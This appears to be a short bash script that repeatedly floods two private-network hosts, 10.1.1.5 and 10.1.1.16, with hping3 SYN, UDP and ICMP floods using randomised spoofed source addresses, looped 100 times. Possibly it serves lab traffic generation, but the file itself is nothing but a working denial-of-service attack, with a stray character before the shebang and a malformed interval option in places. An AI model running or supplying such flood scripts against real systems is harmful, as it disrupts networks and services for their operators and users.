s#!/bin/bash
for i in {1..100}
do
   ping -c1 10.1.1.5
   #TCP SYN flood, , and ICMP flood
   hping3 --rand-source -i u10000 -S -d 64  -c 1000 10.1.1.5
   
   #UDP flood
   hping3 -2 --rand-source -i u15000  -d 64  -c 1000 10.1.1.5

   #ICMP flood
   hping3 -1 --rand-source -i u20000 -d 64  -c 1000 10.1.1.5

   #TCP SYN flood, , and ICMP flood
   hping3 --rand-source -i u25000 -S -d 64  -c 1000 10.1.1.5
   
   #UDP flood
   hping3 -2 --rand-source -i u30000  -d 64  -c 1000 10.1.1.5

   #ICMP flood
   hping3 -1 --rand-source -i u 35000 -d 64  -c 1000 10.1.1.5
   ping -c1 10.1.1.16
   #TCP SYN flood, , and ICMP flood
   hping3 --rand-source -i u10000 -S -d 64  -c 1000 10.1.1.16
   
   #UDP flood
   hping3 -2 --rand-source -i u15000  -d 64  -c 1000 10.1.1.16

   #ICMP flood
   hping3 -1 --rand-source -i u20000 -d 64  -c 1000 10.1.1.16

   #TCP SYN flood, , and ICMP flood
   hping3 --rand-source -i u25000 -S -d 64  -c 1000 10.1.1.16
   
   #UDP flood
   hping3 -2 --rand-source -i u30000  -d 64  -c 1000 10.1.1.16

   #ICMP flood
   hping3 -1 --rand-source -i u 35000 -d 64  -c 1000 10.1.1.16
done


